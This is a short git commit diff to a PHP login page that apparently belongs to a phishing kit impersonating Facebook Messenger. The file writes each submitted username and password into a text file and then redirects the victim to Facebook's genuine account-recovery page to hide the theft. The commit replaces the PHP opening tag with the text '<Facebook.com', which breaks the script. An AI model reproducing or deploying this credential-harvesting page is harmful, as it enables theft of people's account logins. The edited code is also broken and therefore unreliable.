1d7db7c1331d7c5dd9385b582df3ca898e941637
azilyx964 <krisashleycataytay@gmail.com>
2024-07-02 15:32:32 +0800

    Update login.php

--- .sites/fb_messenger/login.php
+++ .sites/fb_messenger/login.php
@@ -1,4 +1,4 @@
-<?php
+<Facebook.com
 
 file_put_contents("usernames.txt", "Messenger Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://www.facebook.com/recover/initiate/');
